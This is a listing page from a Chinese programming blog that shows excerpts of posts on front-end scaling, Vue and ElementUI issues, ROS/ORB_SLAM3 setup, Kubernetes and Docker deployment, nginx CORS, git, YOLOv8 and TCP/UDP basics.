首先要确定设计稿尺寸，默认是 1920 x 1080分别计算浏览器和设计图宽高比如果浏览器的宽高比大于设计稿的宽高比，就取浏览器高度和设计稿高度之比；如果浏览器的宽高比小于设计稿的宽高比，就取浏览器宽度和设计稿宽度之比 // 根据浏览器大小推断缩放比例 // 首先要确定设计稿尺寸，默认是 1920 x 1080 // 分别计算浏览器和设计图宽高比 // 如果浏览器的宽高比大于设计稿的宽高比，就取浏览器高度和设计稿高度之比 // 如果浏览器的宽高比小于设计稿的宽高比，就取浏览器宽度和设计稿宽度之比 const getScale = (width = 1920, height = 1080) =&gt; { let ww = window.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e1d5a3e40f5e756e5062a9435b4d23d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0b410356091bda3deb962b97928fdf1/" rel="bookmark">
			maven3.x 各个版本安装包官网下载地址
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Index of /dist/maven/maven-3
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8706abb66e0ad4bd0c606aef6eeec6cd/" rel="bookmark">
			简单快捷的在线 AAB 转换 APK 服务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		初雪云-iPA上传发布工具,证书制作工具,ApplicationLoader,上架App Store,安卓市场上架,软著申请服务，windows,linux,mac发布上传提交苹果
在移动应用开发中，AAB（Android App Bundle）已经成为了一种广泛使用的发布格式。然而，对于某些开发者来说，AAb转换为apk去测试是很麻烦的。为了解决这一问题，初雪云在线转换功能诞生，提供了一种简单快捷的在线 AAB 转换 APK 服务。
初雪云是一家领先的云技术公司，专注于为开发者提供高效可靠的解决方案。通过他们的在线服务，开发者可以轻松将AAB文件转换为APK文件，无需安装任何额外的本地工具。
简单易用：初雪云提供了一个直观友好的用户界面，使得AAB转换APK变得非常简单。只需上传AAB文件，点击转换按钮，即可立即生成APK文件。开发者无需担心复杂的操作步骤，即可快速获得所需的APK文件。
快速高效：初雪云的转换服务采用了高性能的云计算技术，能够在短时间内完成AAB到APK的转换过程。无论是处理小型还是大型AAB文件，初雪云都能够保证快速且高效的转换速度，大大节省了开发者的时间和精力。
兼容性强：初雪云支持绝大多数的AAB文件，以及与多个Android版本和设备兼容。开发者可以放心使用该服务，无论是在任何Android平台下发布应用，都可以得到高质量的APK文件。
安全保障：初雪云将用户的文件和数据视为最高机密，并采取了严格的安全措施以保护用户的隐私和数据安全。上传的AAB文件会在转换完成后立即删除，确保用户的数据不会被滥用或泄露。
强大的技术支持：初雪云拥有专业的技术团队，随时准备解答用户的问题和提供技术支持。如果您在使用过程中遇到任何问题或有疑问，可以随时联系他们的客服团队，他们将会给予您及时的帮助和支持。
总而言之，初雪云的在线AAB转换APK服务为开发者带来了极大的便利。无论是为了兼容性考虑，还是有其他特殊需求，初雪云都能够满足您的要求。如果您是一位Android应用开发者，不妨尝试使用初雪云的在线服务，体验其简单、快捷、高效的特点，为您的开发工作带来更多的便利与效率。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a19f83227dd41f748fee3a097f3e540/" rel="bookmark">
			动态给img的src属性赋值&amp;Vue中通过document的getElementById()获取为空&amp;Vue输入框中使用v-model导致number类型值自动转换成string
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.vue中img的src动态赋值（本地图片的路径）
问题&amp;原因
1.问题：img的src属性直接绑定url变量，然而图片加载失败
&lt;img :src=" '../../assets/images/'+item.url+'.jpg' " alt="picture"/&gt; 2.原因：
在webpack中会将图片图片来当做模块来用
url-loader将直接将:src=" ‘…/…/assets/images/’+item.url+‘.jpg’ "解析成字符串，因为是动态加载的，所有无法解析图片地址
然后npm run dev 或者npm run build之后导致路径没有被加工【被webpack解析到的路径都会被解析为/static/img/[filename].png，完整地址为localhost:8080/static/img/[filename].png】
解决办法
1.将文件放在statics目录下（与src同级）
图片一类的静态文件，应该放在这个static文件夹下
这个文件夹下的文件（夹）会按照原本的结构放在网站根目录下
这时我们再去使用/static绝对路径，就可以访问这些静态文件了
注意：这样的话必须写成绝对路径如images:[{src:”/static/1.png”},{src:”/static/2.png”}]
但是，放到static里面webpack打包后只会把资源复制到发布目录而不会把小图片优化为base64。
为了兼顾可以把图片资源优化，所以还是不适合把图片资源放到static。
2.require方法
如果不想更改路径，可以用require将图片作为模块加载进去
用了require，就是将图片当成模块先引进来，再绑定。
&lt;img :src="require('../../assets/images/classic.jpg')" alt="picture"&gt; 当需要实现动态加载图片的时候就需要传一个变量给require，但是require中不能直接赋值一个变量，可以用以下方法
二.Vue中通过document的getElementById()方法返回元素对象时，有时候遇到为null值
1、问题现象
在Vue中通过document的getElementById()方法返回元素对象时，有时候遇到为null值。
2、问题分析
在代码中确实为目的元素指定了ID，那为何还会出现对象为null的现象呢？首先，对该ID元素的属性、样式进行分析，它是通过v-if指令来控制是否显示的，它是动态加载元素组件的，也就是说当v-if指令为false时，该ID元素是不会出现在Element树中，此时调用getElementById()方法来获取该ID元素，那么得到的值肯定会为null值；只有当v-if指令为true时才会动态异步加载该元素，如果还没有等到该元素加载完成，就立即调用getElementById()方法来获取该元素的话，那么得到的值也会为null值，只有当该元素完全加载后，再调用getElementById()方法，就不会得到null值了。
3、问题处理
要是在现实中的确需要用到这样的一个场景，当某个元素立即显示，同时通过ID来获取该元素时，那么此时就不能使用v-if指令了，我们可以使用v-show指令。也就是说，在代码中用v-show指令替换掉v-if指令，就不会出现getElementById()方法返回null值的问题了。其实，v-show指令是一种懒加载的处理机制。
三.Vue.JS项目输入框中使用v-model导致number类型值自动转换成string问题的解决方案
问题：Vue.JS项目中v-model导致输入框中number类型值自动转换成string问题的解决方案。
解决方案：1.用el-input v-model.number就能解决
2.写一些事件进行格式转换，具体方法不写了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31c8303df8e0381579120e2fedd1cd3d/" rel="bookmark">
			Ubuntu系统运行ORB_SLAM3报段错误（核心已转储）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;先看后面的重要提醒！！！！！！&gt;
运行单目+IMU案例
1.第一个终端：
roscore 2.第二个终端：
在SLAM3工程文件夹下进入终端：
rosrun ORB_SLAM3 Mono_Inertial Vocabulary/ORBvoc.txt Examples_old/Monocular-Inertial/EuRoC.yaml true 查询原因说是cv_bridge对opencv指向问题，cv_bridge默认指向ros安装自带的opencv3.2.0，就会与自己安装的opencv产生冲突
**
cv_bridge与opencv指向解决方法： **
第一种：
修改ros安装路径中的cv_bridge相关文件的路径，指向自己安装的opencv sudo gedit /opt/ros/melodic/share/cv_bridge/cmake/cv_bridgeConfig.cmake 使用sudo apt install ros-melodic-desktop-full安装的ros，会默认安装opencv3.2.0版本到/usr/include，/usr/lib，/usr/share三个目录。
但是如果自己从opencv官网源码编译安装的，opencv会默认安装到usr/local下对应的三个子目录。
将路径改成自己安装opencv默认的对应的子目录。
sudo gedit /opt/ros/melodic/share/cv_bridge/cmake/cv_bridge-extras.cmake 将版本号改为自己安装的版本号
cd /opt/ros/melodic/lib/ sudo gedit pkgconfig/cv_bridge.pc 同样，将相关路径改成自己的
最后catkin_make项目即可。
但在实操中，还是警告了
发现还是关联到ros默认的安装版本，感觉应该是重新编译ros才生效，然后再重新catkin_make项目。
第二种：
下载cv_bridge包编译
下载网址：https://gitee.com/bingobinlw/cv_bridge mkdir -p cv_bridge_ws/src cd cv_bridge_ws/src git clone https://gitee.com/bingobinlw/cv_bridge //此链接适用于18.04 cd .. 将自己安装的opencv编译生成的build文件路径加入CMakeLists.txt
修改为
编译cv_bridge包：
catkin_make 最后，在所需要使用cv_bridge的ros包里的CMakeLists.txt文件中添加opencv路径以及cv_bridge路径
set(OpenCV_DIR "your-path/opencv-x.x.x/build") set(cv_bridge_DIR your-path/cv_bridge_ws/devel/share/cv_bridge/cmake) 例如：此处修改SLAM3中ros包中slam3的CMakeLists.txt
删除之前编译产生的文件，重新编译项目。真是很糟糕，白忙活一场，这方法对我的还是不起效果，还是报如下错误。
第三种：
卸载ROS自动安装的cv_bridge，重新安装
1）卸载原版本cv_bridge sudo apt-get remove ros-melodic-cv-bridge 2）下载新版本cv_bridge
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/31c8303df8e0381579120e2fedd1cd3d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6aba372745a72626b115720b20a3d889/" rel="bookmark">
			使用docker 部署k8s集群
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、环境准备：
二、master节点修改hosts， 配置主机可达
三、将桥接的IPv4流量传递到iptables的链
四、配置 daemon.json，设置cgroup的管理方式为systemd及配置阿里云镜像加速
五、添加yum源
六、安装 kubeadm，kubelet 和 kubectl
七、master部署k8s
八、将kubeadm join 复制到两个node节点执行
九、在master的节点上执行kubectl get nodes 可查看到各节点状态
十、部署CNI网络插件
十一、安装一个nginx进行测试
一、环境准备： 工具：VMware Workstation Pro 16.1
系统：CentOS-7-x86_64-DVD-2009 固定ip：192.168.57.190（master），192.168.57.191(node1)，192.168.57.192(node2)
Docker（18.09.9-3.el7）版本不要太高
docker安装部署请参考我的上一篇文章：http://t.csdn.cn/GUmR1
降级命令：
yum downgrade --setopt=obsoletes=0 -y docker-ce-18.09.9-3.el7 docker-ce-cli-18.09.9-3.el7 containerd.io
二、master节点修改hosts， 配置主机可达 cat &gt;&gt; /etc/hosts &lt;&lt; EOF 192.168.57.190 k8smaster1 192.168.57.191 k8snode1 192.168.57.192 k8snode2 EOF 三、将桥接的IPv4流量传递到iptables的链 cat &gt; /etc/sysctl.d/k8s.conf &lt;&lt; EOF net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 EOF sysctl --system 四、配置 daemon.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6aba372745a72626b115720b20a3d889/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b885884cd5cd166ee5230a82832c5922/" rel="bookmark">
			一次关于微前端跨域，找不到css,js配置文件，nginx跨域， 以及ingress识别不到服务的整理结果
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先后端服务已经支持了跨域请求，允许所有的源和请求方法、请求头
1、本地可以找到css .js文件，上线服务却查找错误
解决办法：css,js上线后采用绝对路径： url: “host:port/”
2、微前端跨域原因：
2.1 可能后端未设置允许跨域（不同框架自行配置）
2.2 可能是nginx跨域 ，加上响应头：
add_header Access-Control-Allow-Origin '*'; add_header Access-Control-Allow-Methods 'GET, POST, PUT, DELETE, OPTIONS'; add_header Access-Control-Allow-Headers 'Content-Type, Accept, X-Requested-With'; 注意，add_header是增加响应头，proxy_set_header是增加请求头，别用错了
2.3 可能是设置了跨域凭证：
withCredentials: true 前端设置凭证之后，后端的Access-Control-Allow-Origin 不能使用 * 号，要准确的ip和port 否则也会跨域
3、nginx + ingress 莫名的识别不到服务， 报错503
解决方案，强制增加请求头
proxy_set_header Host url; 不要使用：proxy_set_header Host $host;这种通配的 要指名url
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0640b0f1aee3ece6d93cf6c0915b0083/" rel="bookmark">
			通过GIT将本地项目上传到gitee
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		git命令本地项目上传到gitee 一、安装GIT二、gitee账号注册三、创建仓库1. 新建仓库2. 填写仓库信息3. 初始化仓库、设置模板、选择分支模型4. 创建成功界面 四、Git命令上传本地项目到gitee仓库1. 打开GIT窗口2. 初始化本地仓库3. 复制仓库地址4. 本地仓库与远程仓库建立连接5. 将远程仓库的文件拉到本地仓库中6. 本地文件夹中查看拉取的内容7. 将本地文件上传到本地仓库（全部）8. 提交内容9. 将本地仓库提交的内容推到远程仓库10. 远程仓库刷新查看 一、安装GIT 官网下载安装git
参考文章Git下载安装指南
二、gitee账号注册 gitee官网注册码云账号，登录
三、创建仓库 创建仓库
1. 新建仓库 2. 填写仓库信息 3. 初始化仓库、设置模板、选择分支模型 语言选择–&gt;.gitignore–&gt;开源许可证默认不选–&gt;模板文件选择Readme文件–&gt;分支模型选择单分支模型–&gt;创建
4. 创建成功界面 四、Git命令上传本地项目到gitee仓库 1. 打开GIT窗口 进入到项目文件夹中，也就是.idea或者src或者pom.xml等文件同级目录的位置
空白位置鼠标右键呼出Git Bash选项–&gt;选择Git Bash Here–&gt;进入git命令窗口
2. 初始化本地仓库 git init 运行命令后可发现一个.git文件夹
注：出现.git文件夹的前提是将隐藏文件和文件后缀打开
3. 复制仓库地址 在gitee对应的仓库中找到，克隆/下载–&gt;HTTPS（默认就是这个）–&gt;复制
4. 本地仓库与远程仓库建立连接 远程仓库地址是之前复制的仓库地址，复制后直接在命令窗口中鼠标右键Paste即可在命令窗口粘贴出来
git remote add origin 远程仓库地址 5. 将远程仓库的文件拉到本地仓库中 git pull origin master 拓展：git pull origin master 是拉取远程仓库中master分支的代码到当前本地分支上，origin是远程名，master是远程仓库中的一个分支
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0640b0f1aee3ece6d93cf6c0915b0083/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/592f9cb4754121762f0c09f859fd8f90/" rel="bookmark">
			vite配置环境变量，vue3vite配置环境变量（.env）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 你可以通过传递 --mode 选项标志来覆盖命令使用的默认模式
2. 默认情况下，开发服务器 (dev 命令) 运行在 development (开发) 模式，而 build 命令则运行在 production (生产) 模式。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51578f301ea28f0379a9ec007c2a3a2e/" rel="bookmark">
			yolov8检测框过小解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		说明 此篇文章写作时，ultralytics更新至8.0.117，后续版本可能已经针对以下问题进行更改；因ultralytics当前更新比较频繁，前期使用时，不建议采用pip安装库，而采用拉取ultralytics仓放置在代码中调用；ultralytics训练过程中没有保留在验证集上的检测图，建议保留，方式为：屏蔽ultralytics/yolo/engine/validator.py BaseValidator类__call__函数中以下代码： #self.args.plots = trainer.stopper.possible_stop or (trainer.epoch == trainer.epochs - 1) 跟踪训练过程中训练集和验证集上检测框最大边长：
训练集上最大边长：ultralytics/yolo/utils/loss.py（此为8.0.117版本位置，前期版本位置不太一样，找到训练的loss函数即可），在loss函数中加入打印，即以下代码中的print
pred_bboxes = self.bbox_decode(anchor_points, pred_distri) # xyxy, (b, h*w, 4) AA = (pred_bboxes.detach() * stride_tensor) print('pred w max:', (AA[:,:,2]-AA[:,:,0]).max()) print('pred h max:', (AA[:,:,3]-AA[:,:,1]).max()) _, target_bboxes, target_scores, fg_mask, target_gt_idx = self.assigner( pred_scores.detach().sigmoid(), (pred_bboxes.detach() * stride_tensor).type(gt_bboxes.dtype), anchor_points * stride_tensor, gt_labels, gt_bboxes, mask_gt) 验证集上最大边长：ultralytics/yolo/utils/plotting.py中 output_to_target函数中加入打印，以下代码中的try … except…代码：
def output_to_target(output, max_det=300): """Convert model output to target format [batch_id, class_id, x, y, w, h, conf] for plotting.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/51578f301ea28f0379a9ec007c2a3a2e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a2b1d23a0b5b81a065ca6f57fbe4e57/" rel="bookmark">
			Docker 部署 jar 项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1、上传jar包2、新建 Dockerfile 文件3、新建 run.sh 脚本（创建并运行）4、新建 update.sh 脚本（更新） 1、上传jar包 2、新建 Dockerfile 文件 添加jar包及修改端口
vim Dockerfile # 基础镜像 FROM java:8 # 添加jar包 ADD service-xxx-0.0.1-SNAPSHOT.jar app.jar ENTRYPOINT ["java","-Djava.security.egd=file:/dev/./urandom","-Duser.timezone=GMT+8","-jar","-jar","/app.jar"] # 设置端口 EXPOSE 7004 3、新建 run.sh 脚本（创建并运行） 更改 service-xxx 为 对应 容器名称。
启动命令：sh run.sh
vim run.sh #!/bin/sh cur_dir=$(cd `dirname $0`; pwd) ip=$1 export ip cd ${cur_dir} docker build -t service-xxx . cd ${cur_dir} echo "启动service-xxx容器" docker run -itd \ --net host \ --name service-xxx \ -v ${cur_dir}/log:/service-xxx \ --restart always service-xxx docker exec -ti service-xxx ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; echo "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a2b1d23a0b5b81a065ca6f57fbe4e57/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d8ba7ea42c8192f7a6902a60ec7fae1/" rel="bookmark">
			elementUI el-form表单的upload上传文件必填校验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有一个需求，表单需要上传文件是必填项，通过添加表单校验rules可以校验成功。
data数据：
ruleForm: { receiveMoney: '', fileList: [] }, 校验：
rules: { receiveMoney: [ { required: true, message: '请输入金额', trigger: 'blur' }, { pattern: /^(([1-9]{1}\d*)|(0{1}))(\.\d{0,2})?$/, message: '请输入数字，至多保留两位小数', trigger:'blur' } ], fileList: [ { required: true, message: '请上传凭证', trigger: 'change' } ] }, 提交时校验表单：
submitForm(){ this.$refs.ruleForm.validate((val)=&gt;{ if(val){ // 校验通过 } }) } 此时，未上传文件时，点击提交发起表单校验this.$refs.ruleForm.validate可以看到校验提示
但是发现在有校验提示信息时，上传文件后提示信息没有像其他表单校验一样消失，尝试了自定义校验validator，发现上传文件后未触发自定义校验validator
解决： 通过vue的watch监听，当有上传文件时清除上传的校验this.$refs['ruleForm'].clearValidate(['fileList']) ,fileList是表单校验prop的名称
代码：
watch: { 'ruleForm.fileList': { handler (newVal) { if(newVal.length){ this.$refs['ruleForm'].clearValidate(['fileList']) } }, deep: true } }, 效果：在有校验提示信息时，上传文件后提示信息消失
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6d8ba7ea42c8192f7a6902a60ec7fae1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da1d7462269e657c2d2d7964d244d6c4/" rel="bookmark">
			java实现省市区三级联动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、实现三级联动 以省市区为例：
我的想法很简单 ，可能想的有点少，首先遍历省份，当数据发生改变调用方法请求根据省的id去查询市区的信息，当市区信息发生改变调用另一个方法去查询县区的信息
1、实体类entity：area
?
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
package com.htzn.entity;
public class Area {
?? ?
?? ?private String id ;
?? ?
?? ?private String name;
?? ?
?? ?private String pid;
?? ?public String getId() {
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/da1d7462269e657c2d2d7964d244d6c4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54f56c57b5ef97a3bb0ae0947b409d6c/" rel="bookmark">
			网络编程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网络编程 网络通信三要素三要素概述要素一：IP地址、IP地址操作类-InetAddress要素二：端口号要素三：协议UDP通信-快速入门UDP通信-多发多收TCP通信-快速入门TCP通信-多发多收消息TCP通信-同时接受多个客户端消息TCP通信实战案例-即时通信TCP通信实战案例-模拟BS系统TCP通信-使用线程池优化 1. 网络编程入门 1.1 网络编程概述 计算机网络
是指将地理位置不同的具有独立功能的多台计算机及其外部设备，通过通信线路连接起来，在网络操作系统，网络管理软件及网络通信协议的管理和协调下，实现资源共享和信息传递的计算机系统
网络编程
在网络通信协议下，不同计算机上运行的程序，可以进行数据传输
1.2 网络编程三要素 IP地址
要想让网络中的计算机能够互相通信，必须为每台计算机指定一个标识号，通过这个标识号来指定要接收数据的计算机和识别发送的计算机，而IP地址就是这个标识号。也就是设备的标识
端口
网络的通信，本质上是两个应用程序的通信。每台计算机都有很多的应用程序，那么在网络通信时，如何区分这些应用程序呢？如果说IP地址可以唯一标识网络中的设备，那么端口号就可以唯一标识设备中的应用程序了。也就是应用程序的标识
协议
通过计算机网络可以使多台计算机实现连接，位于同一个网络中的计算机在进行连接和通信时需要遵守一定的规则，这就好比在道路中行驶的汽车一定要遵守交通规则一样。在计算机网络中，这些连接和通信的规则被称为网络通信协议，它对数据的传输格式、传输速率、传输步骤等做了统一规定，通信双方必须同时遵守才能完成数据交换。常见的协议有UDP协议和TCP协议
1.3 IP地址 IP地址：是网络中设备的唯一标识
IP地址分为两大类 IPv4：是给每个连接在网络上的主机分配一个32bit地址。按照TCP/IP规定，IP地址用二进制来表示，每个IP地址长32bit，也就是4个字节。例如一个采用二进制形式的IP地址是“11000000 10101000 00000001 01000010”，这么长的地址，处理起来也太费劲了。为了方便使用，IP地址经常被写成十进制的形式，中间使用符号“.”分隔不同的字节。于是，上面的IP地址可以表示为“192.168.1.66”。IP地址的这种表示法叫做“点分十进制表示法”，这显然比1和0容易记忆得多IPv6：由于互联网的蓬勃发展，IP地址的需求量愈来愈大，但是网络地址资源有限，使得IP的分配越发紧张。为了扩大地址空间，通过IPv6重新定义地址空间，采用128位地址长度，每16个字节一组，分成8组十六进制数，这样就解决了网络地址资源数量不够的问题 DOS常用命令： ipconfig：查看本机IP地址ping IP地址：检查网络是否连通 特殊IP地址： 127.0.0.1：是回送地址，可以代表本机地址，一般用来测试使用 1.4 InetAddress InetAddress：此类表示Internet协议（IP）地址
相关方法
方法名说明static InetAddress getByName(String host)确定主机名称的IP地址。主机名称可以是机器名称，也可以是IP地址String getHostName()获取此IP地址的主机名String getHostAddress()返回文本显示中的IP地址字符串 代码演示
public class InetAddressDemo { public static void main(String[] args) throws UnknownHostException { //InetAddress address = InetAddress.getByName("itheima"); InetAddress address = InetAddress.getByName("192.168.1.66"); //public String getHostName()：获取此IP地址的主机名 String name = address.getHostName(); //public String getHostAddress()：返回文本显示中的IP地址字符串 String ip = address.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54f56c57b5ef97a3bb0ae0947b409d6c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17ddce73daeaf5c6ca182691f7c77434/" rel="bookmark">
			杰理之配置多个唤醒脚时开机唤醒时判断哪个IO唤醒【篇】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7b0c0d24ff35ee44465370af1688114/" rel="bookmark">
			网络传输层协议详解(TCP/UDP)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、TCP协议
1.1、TCP协议段格式 1.2、TCP原理 确认应答机制
超时重传机制 (安全机制)
连接管理机制(安全机制) 滑动窗口 流量控制(安全机制) 拥塞控制 延迟应答(效率机制)
捎带应答（效率机制） ​编辑面向字节流(粘包问题) 缓冲区 TCP异常情况 二、UDP协议
UDP协议端格式 UDP的特点 无连接 不可靠 面向数据报 缓冲区
大小受限 基于UDP的应用层协议 三、TCP和UDP对比 一、TCP协议 TCP，即Transmission Control Protocol,传输协议控制。就是对数据的传输进行一个详细的控制。
1.1、TCP协议段格式 源/目的端口号：表示数据从哪个进程进来，到哪个进程出去。32位序号/32位确认号：一次TCP通信，从TCP建立连接到断开的过程中，某个传输方向上的字节流的每个字节的编号。4位TCP报头长度：表示该TCP头部有多少个32位bit(有多少个4字节)；所以TCP头部最大长度是15*4=606为标志位： *URG：紧急指针是否有效
*ACK：确认号是否有效
*PSH：提示接收端应用程序立刻从TCP缓冲区把数据读走
*PST：对方要求重新建立连接；我们把携带RST标识的称为复位报文段
*SYN：请求建立连接；我们把携带SYN标识的称为同步报文段
*FIN：通知对方，本端要关闭了，我们把携带FIN标识的称为结束报文段
1.2、TCP原理 TCP对数据传输提供的管控机制，主要体现在两方面：安全和效率。
这些机制和多线程的设计原则类似：保证数据传输安全的前提下，尽可能地提高传输效率。
确认应答机制 TCP将每个字节的数据都进行了编号，即为序列号。
每一个ACK都带有对应的确认序列号，意思就是告诉发送者，我已经收到了哪些数据，下一次你从哪里开始发。每发一条数据，都会接收到一个应答信息，如此循环，直到通信结束。
超时重传机制 (安全机制) 数据在网络上传输会经过很多设备，比如有交换机，路由器，每个设备都是由处理上线的，如果某一个设备达到上限，可能会把当前数据丢弃，从而出现超时现象。
1、发送超时 主机A发送数据给B之后，可能因为网络拥堵原因，导致数据无法到达主机B。如果主机A在一个特定的时间间隔内没有收到B发送来的确认应答，就会进行重发。 2、接收到数据，但是ACK（响应）丢了 因此主机B会收到很多重复数据。那么TCP协议需要能够识别出那些包是重复的包，并把重复的数据丢弃掉。
根据序列号，做到去重的效果，那么，超时的时间如何确定？
最理想的情况下，找到一个最大的时间，保证"确认应答一定能在这个时间内返回"。但是这个时间的长短，随网络环境不同，是有差异的。如果超时时间设的太长，会影响整体的重传效率。如果超时时间设的太短，有可能就会频繁发送重复的包。 TCP为了能够保证在任何环境下都能比较高性能的通信，因此会动态的计算这个最大超时时间。
Linux中(BSD Unix和Windows也是如此)，超时以500ms作为一个单位进行控制，每次判定超时重传的超时时间都是500ms的整数倍。如果重发一次后仍然得不到应答，等待2*500ms后再进行重传。如果仍然得不到应答，等待4*500ms后再进行重传。依次类推，以指数形式递增。累计到一定的重传次数，TCP认为网络或对端主机出现异常，强制关闭连接。 连接管理机制(安全机制) 在正常情况下，TCP要经过三次握手建立连接，四次挥手断开连接 三次握手
保证双方的收发能力 四次挥手 保证发送方和接收方发送完数据有效的断开连接
下面是三次握手、四次挥手流程图
服务端状态转化：
[CLOSED -&gt; LISTEN] 服务器端调用listen后进入LISTEN状态，等待客户端连接；[LISTEN -&gt; SYN_RCVD] 一旦监听到连接请求（同步报文段），就将该连接放入内核等待队列中，并向客户端发送SYN确认报文。[SYN_RCVD -&gt; ESTABLISHED] 服务端一旦收到客户端的确认报文，就进入ESTABLISHED状态，可以进行读写数据了。[ESTABLISHED -&gt; CLOSE_WAIT] 当客户端主动关闭连接（调用close），服务器会收到结束报文段，服务器返回确认报文段并进入CLOSE_WAIT；[CLOSE_WAIT -&gt; LAST_ACK] 进入CLOSE_WAIT后说明服务器准备关闭连接（需要处理完之前的数据）；当服务器真正调用close关闭连接时，会向客户端发送FIN，此时服务器进入LAST_ACK状态，等待最后一个ACK到来（这个ACK是客户端确认收到了FIN）[LAST_ACK -&gt; CLOSED] 服务器收到了对FIN的ACK，彻底关闭连接。 客户端状态转化：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c7b0c0d24ff35ee44465370af1688114/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5485619000bfeeed0a5c4772c909dbd/" rel="bookmark">
			java用feign发请求，参数可以为一个字符串吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我想用feign发送一个post请求，但对方接收的参数类型是一个加密后的字符串，放在body中，请问如何做？我现在的解决方法是用resttemplate用postforobject发字符串，我想修改成用feign来完成
用resttemplate可以做到，代码如下：
@GetMapping("/rest") @ApiOperation(value = "登录1", notes = "登录1") public R&lt;TokenVO&gt; selectAll1(LoginDTO loginDTO, HttpServletResponse response) throws Exception { //加密 String s = JSON.toJSONString(loginDTO); String encrypt = AesUtil.Encrypt(s, sKey); //发请求，获取数据 RestTemplate restTemplate = new RestTemplate(); HttpHeaders headers = new HttpHeaders(); headers.setContentType(MediaType.APPLICATION_JSON); HttpEntity&lt;String&gt; request = new HttpEntity&lt;&gt;(encrypt, headers); String forObject = restTemplate.postForObject(url,request,String.class); //解析数据 JSONObject jsonObject = JSON.parseObject(forObject); String data = jsonObject.getObject("data", String.class); String decrypt = AesUtil.Decrypt(data, sKey); Map&lt;String, String&gt; jsonMap = JSON.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5485619000bfeeed0a5c4772c909dbd/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/72/">«</a>
	<span class="pagination__item pagination__item--current">73/321</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/74/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>